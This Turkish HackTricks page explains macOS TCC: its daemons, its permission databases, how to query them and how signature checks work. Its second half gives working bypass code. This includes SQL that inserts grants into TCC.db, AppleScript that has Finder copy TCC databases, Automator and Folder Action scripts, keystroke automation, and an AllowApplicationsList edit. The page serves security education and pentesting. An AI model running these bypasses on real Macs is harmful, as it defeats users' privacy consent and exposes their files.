# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Temel Bilgiler**

**TCC (Şeffaflık, Onay ve Kontrol)**, uygulama izinlerini düzenlemeye odaklanan bir güvenlik protokolüdür. Temel rolü, **konum hizmetleri, kişiler, fotoğraflar, mikrofon, kamera, erişilebilirlik ve tam disk erişimi** gibi hassas özellikleri korumaktır. TCC, bu unsurlara uygulama erişimi vermeden önce açık kullanıcı onayı talep ederek, gizliliği ve kullanıcıların verileri üzerindeki kontrolünü artırır.

Kullanıcılar, uygulamalar korunan özelliklere erişim talep ettiğinde TCC ile karşılaşır. Bu, kullanıcılara **erişimi onaylama veya reddetme** imkanı sunan bir istem aracılığıyla görünür. Ayrıca, TCC, belirli dosyalara erişim vermek için **dosyaları bir uygulamaya sürükleyip bırakma** gibi doğrudan kullanıcı eylemlerini de destekler; bu sayede uygulamalar yalnızca açıkça izin verilenlere erişim sağlar.

![TCC isteminin bir örneği](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**, `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` konumundaki **daemon** tarafından yönetilir ve `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` dosyasında yapılandırılır (mach servisi `com.apple.tccd.system` kaydedilir).

Her bir oturum açmış kullanıcı için `/System/Library/LaunchAgents/com.apple.tccd.plist` dosyasında tanımlanan bir **kullanıcı modu tccd** çalışmaktadır; bu, `com.apple.tccd` ve `com.apple.usernotifications.delegate.com.apple.tccd` mach servislerini kaydeder.

Burada tccd'nin sistem ve kullanıcı olarak çalıştığını görebilirsiniz:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
İzinler **ebeveyn** uygulamadan **devralınır** ve **izinler**, **Bundle ID** ve **Geliştirici ID** temelinde **izlenir**.

### TCC Veritabanları

İzinler/retler daha sonra bazı TCC veritabanlarında saklanır:

- Sistem genelindeki veritabanı **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Bu veritabanı **SIP korumalıdır**, bu nedenle yalnızca bir SIP bypass'ı içine yazabilir.
- Kullanıcı TCC veritabanı **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** her kullanıcı için tercihleri saklar.
- Bu veritabanı korunmaktadır, bu nedenle yalnızca Full Disk Access gibi yüksek TCC ayrıcalıklarına sahip süreçler buna yazabilir (ancak SIP tarafından korunmaz).

> [!WARNING]
> Önceki veritabanları da **okuma erişimi için TCC korumalıdır**. Bu nedenle, **TCC ayrıcalıklı bir süreçten** gelmediği sürece normal kullanıcı TCC veritabanınızı **okuyamazsınız**.
>
> Ancak, bu yüksek ayrıcalıklara sahip bir süreç (örneğin **FDA** veya **`kTCCServiceEndpointSecurityClient`**) kullanıcıların TCC veritabanına yazabilecektir.

- **Konum hizmetlerine** erişim izni verilen istemcileri belirtmek için **`/var/db/locationd/clients.plist`** adlı **üçüncü** bir TCC veritabanı vardır.
- SIP korumalı dosya **`/Users/carlospolop/Downloads/REG.db`** (TCC ile okuma erişiminden de korunmuştur), tüm **geçerli TCC veritabanlarının** **konumunu** içerir.
- SIP korumalı dosya **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (TCC ile okuma erişiminden de korunmuştur), daha fazla TCC verilen izinleri içerir.
- SIP korumalı dosya **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (herkes tarafından okunabilir) TCC istisnası gerektiren uygulamaların izin listesi olarak işlev görür.

> [!TIP]
> TCC veritabanı **iOS**'ta **`/private/var/mobile/Library/TCC/TCC.db`** içindedir.

> [!NOTE]
> **Bildirim merkezi UI** sistem TCC veritabanında **değişiklikler** yapabilir:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Ancak, kullanıcılar **`tccutil`** komut satırı aracı ile **kuralları silebilir veya sorgulayabilir**.

#### Veritabanlarını Sorgulama

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Her iki veritabanını kontrol ederek bir uygulamanın izin verdiği, yasakladığı veya sahip olmadığı izinleri kontrol edebilirsiniz (bunu isteyecektir).

- **`service`** TCC **izin** dizesinin temsilidir
- **`client`** izinlerle birlikte **bundle ID** veya **ikili dosya yolu**'dur
- **`client_type`** bunun bir Bundle Identifier(0) mı yoksa mutlak yol(1) mu olduğunu belirtir

<details>

<summary>Mutlak yol ise nasıl çalıştırılır</summary>

Sadece **`launctl load you_bin.plist`** komutunu çalıştırın, bir plist ile:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** farklı değerler alabilir: denied(0), unknown(1), allowed(2) veya limited(3).
- **`auth_reason`** aşağıdaki değerleri alabilir: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- **csreq** alanı, ikili dosyanın nasıl doğrulanacağını ve TCC izinlerinin nasıl verileceğini belirtmek için vardır:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Daha fazla bilgi için tablonun **diğer alanları** hakkında [**bu blog yazısını kontrol edin**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Ayrıca `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` kısmında uygulamalara **verilmiş izinleri** kontrol edebilirsiniz.

> [!TIP]
> Kullanıcılar _şu_ **kuralları silebilir veya sorgulayabilir** **`tccutil`** kullanarak.

#### TCC izinlerini sıfırlama
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC İmza Kontrolleri

TCC **veritabanı**, uygulamanın **Bundle ID**'sini saklar, ancak aynı zamanda izin kullanmak isteyen uygulamanın doğru olduğundan emin olmak için **imza** hakkında **bilgi** de **saklar**.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Bu nedenle, aynı adı ve paket kimliğini kullanan diğer uygulamalar, diğer uygulamalara verilen izinlere erişemeyeceklerdir.

### Yetkiler ve TCC İzinleri

Uygulamalar **sadece** bazı kaynaklara **erişim talep etmekle** kalmaz, aynı zamanda **ilgili yetkilere sahip** olmaları da gerekir.\
Örneğin, **Telegram** uygulaması **kamera erişimi** talep etmek için `com.apple.security.device.camera` yetkisine sahiptir. Bu **yetkiye sahip olmayan** bir **uygulama**, kameraya erişemez (ve kullanıcıdan izin istenmez).

Ancak, uygulamaların `~/Desktop`, `~/Downloads` ve `~/Documents` gibi **belirli kullanıcı klasörlerine** **erişebilmesi** için herhangi bir özel **yetkiye sahip olmaları gerekmez.** Sistem, erişimi şeffaf bir şekilde yönetecek ve gerektiğinde **kullanıcıyı bilgilendirecektir.**

Apple'ın uygulamaları **bildirim oluşturmaz.** Yetki listelerinde **önceden verilmiş haklar** içerirler, bu da onların **asla bir açılır pencere oluşturmayacağı** ve **TCC veritabanlarında** görünmeyecekleri anlamına gelir. Örneğin:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Bu, Takvim'in kullanıcıdan hatırlatıcılar, takvim ve adres defterine erişim istemesini engelleyecektir.

> [!TIP]
> Yetkilere dair bazı resmi belgelerin yanı sıra, **yetkiler hakkında ilginç bilgileri** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) adresinde bulmak da mümkündür.

Bazı TCC izinleri şunlardır: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Hepsini tanımlayan kamuya açık bir liste yoktur ama bu [**bilinenlerin listesine**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) göz atabilirsiniz.

### Hassas korumasız yerler

- $HOME (kendisi)
- $HOME/.ssh, $HOME/.aws, vb.
- /tmp

### Kullanıcı Niyeti / com.apple.macl

Daha önce belirtildiği gibi, bir dosyaya bir Uygulamaya **erişim vermek için sürükleyip bırakmak** mümkündür. Bu erişim, herhangi bir TCC veritabanında belirtilmeyecek, ancak dosyanın **genişletilmiş** **özelliği** olarak saklanacaktır. Bu özellik, izin verilen uygulamanın **UUID'sini** **saklayacaktır**:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!NOTE]
> İlginçtir ki, **`com.apple.macl`** özelliği **Sandbox** tarafından yönetilmektedir, tccd tarafından değil.
>
> Ayrıca, bilgisayarınızdaki bir uygulamanın UUID'sini içeren bir dosyayı farklı bir bilgisayara taşırseniz, aynı uygulamanın farklı UID'leri olacağı için, o uygulamaya erişim izni verilmeyeceğini unutmayın.

Genişletilmiş özellik `com.apple.macl` **diğer genişletilmiş özellikler gibi** temizlenemez çünkü **SIP tarafından korunmaktadır**. Ancak, [**bu yazıda açıklandığı gibi**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), dosyayı **zipleyerek**, **silerek** ve **zipten çıkararak** devre dışı bırakmak mümkündür.

## TCC Privesc & Bypasslar

### TCC'ye Ekle

Eğer bir noktada TCC veritabanında yazma erişimi elde ederseniz, bir giriş eklemek için aşağıdakine benzer bir şey kullanabilirsiniz (yorumları kaldırın):

<details>

<summary>TCC'ye Ekleme örneği</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Yükleri

Eğer bazı TCC izinleri ile bir uygulamaya girmeyi başardıysanız, bunları kötüye kullanmak için TCC yükleri ile ilgili aşağıdaki sayfayı kontrol edin:

{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Etkinlikleri

Apple Etkinlikleri hakkında bilgi edinin:

{{#ref}}
macos-apple-events.md
{{#endref}}

### Otomasyon (Finder) ile FDA\*

Otomasyon izninin TCC adı: **`kTCCServiceAppleEvents`**\
Bu özel TCC izni, TCC veritabanı içinde **yönetilebilecek uygulamayı** da belirtir (yani izinler her şeyi yönetmeye izin vermez).

**Finder**, **her zaman FDA'ya** sahip olan bir uygulamadır (UI'de görünmese bile), bu nedenle eğer üzerinde **Otomasyon** ayrıcalıklarınız varsa, bu ayrıcalıkları **bazı eylemleri gerçekleştirmek için** kötüye kullanabilirsiniz.\
Bu durumda uygulamanızın **`com.apple.Finder`** üzerinde **`kTCCServiceAppleEvents`** iznine ihtiyacı olacaktır.

{{#tabs}}
{{#tab name="Kullanıcıların TCC.db'sini Çal"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Bunu **kendi kullanıcı TCC veritabanınızı yazmak için** kötüye kullanabilirsiniz.

> [!WARNING]
> Bu izinle **Finder'dan TCC kısıtlı klasörlere erişim istemek** ve size dosyaları vermesini sağlamak mümkün olacak, ancak bildiğim kadarıyla **Finder'ın rastgele kod çalıştırmasını sağlayamayacaksınız** ve FDA erişimini tam olarak kötüye kullanamayacaksınız.
>
> Bu nedenle, tam FDA yeteneklerini kötüye kullanamayacaksınız.

Finder üzerinde Otomasyon ayrıcalıkları almak için TCC istemi:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> **Automator** uygulamasının TCC izni **`kTCCServiceAppleEvents`** olduğu için, **herhangi bir uygulamayı** kontrol edebilir, örneğin Finder. Dolayısıyla Automator'ı kontrol etme iznine sahip olduğunuzda, aşağıdaki gibi bir kodla **Finder'ı** da kontrol edebilirsiniz:

<details>

<summary>Automator içinde bir shell alın</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

**Script Editor uygulamasıyla** de aynı şey oluyor, Finder'ı kontrol edebilir, ancak bir AppleScript kullanarak bir scripti çalıştırmaya zorlayamazsınız.

### Otomasyon (SE) ile bazı TCC

**Sistem Olayları Klasör Eylemleri oluşturabilir ve Klasör eylemleri bazı TCC klasörlerine erişebilir** (Masaüstü, Belgeler ve İndirilenler), bu nedenle aşağıdaki gibi bir script bu davranışı kötüye kullanmak için kullanılabilir:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Otomasyon (SE) + Erişilebilirlik (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** FDA\*

**`System Events`** üzerindeki otomasyon + Erişilebilirlik (**`kTCCServicePostEvent`**) süreçlere **tuş vuruşları göndermeye** olanak tanır. Bu şekilde, Finder'ı kötüye kullanarak kullanıcıların TCC.db'sini değiştirebilir veya rastgele bir uygulamaya FDA verebilirsiniz (bunun için şifre istenebilir).

Kullanıcıların TCC.db'sini yazan Finder örneği:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` için FDA\*

Accessibility izinlerini kötüye kullanmak için bazı [**payload'lar**](macos-tcc-payloads.md#accessibility) kontrol edin, örneğin FDA\*'ya privesc yapmak veya bir keylogger çalıştırmak için.

### **Endpoint Security Client için FDA**

Eğer **`kTCCServiceEndpointSecurityClient`**'e sahipseniz, FDA'ya sahipsiniz. Son.

### Sistem Politikası SysAdmin Dosyası için FDA

**`kTCCServiceSystemPolicySysAdminFiles`** bir kullanıcının **`NFSHomeDirectory`** özniteliğini **değiştirmesine** izin verir, bu da ev klasörünü değiştirir ve dolayısıyla **TCC'yi atlamasına** olanak tanır.

### Kullanıcı TCC DB için FDA

**Kullanıcı TCC** veritabanında **yazma izinleri** elde ederek kendinize **`FDA`** izinleri veremezsiniz, yalnızca sistem veritabanında bulunan kişi bunu verebilir.

Ama kendinize **`Finder için Otomasyon hakları`** verebilir ve önceki tekniği kullanarak FDA\*'ya yükseltebilirsiniz.

### **FDA'dan TCC izinlerine**

**Tam Disk Erişimi** TCC adı **`kTCCServiceSystemPolicyAllFiles`**'dır.

Bunun gerçek bir privesc olduğunu düşünmüyorum, ama yine de faydalı bulursanız: Eğer FDA'ya sahip bir programı kontrol ediyorsanız, **kullanıcıların TCC veritabanını değiştirebilir ve kendinize her türlü erişim verebilirsiniz**. Bu, FDA izinlerinizi kaybetme durumunda kalıcı bir teknik olarak faydalı olabilir.

### **SIP Atlaması ile TCC Atlaması**

Sistem **TCC veritabanı** **SIP** ile korunmaktadır, bu yüzden yalnızca **belirtilen haklara sahip** süreçler bunu değiştirebilir. Bu nedenle, bir saldırgan bir **SIP atlaması** bulursa (SIP tarafından kısıtlanan bir dosyayı değiştirebilirse), şunları yapabilir:

- **TCC veritabanının korumasını kaldırabilir** ve kendisine tüm TCC izinlerini verebilir. Örneğin bu dosyalardan herhangi birini kötüye kullanabilir:
- TCC sistem veritabanı
- REG.db
- MDMOverrides.plist

Ancak, bu **SIP atlamasını TCC'yi atlamak için** kötüye kullanmanın başka bir seçeneği vardır, `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` dosyası, bir TCC istisnası gerektiren uygulamaların izin listesi. Bu nedenle, bir saldırgan bu dosyadan **SIP korumasını kaldırabilir** ve kendi **uygulamasını** eklerse, uygulama TCC'yi atlayabilecektir.\
Örneğin terminal eklemek için:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypass'ları

{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Referanslar

- [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
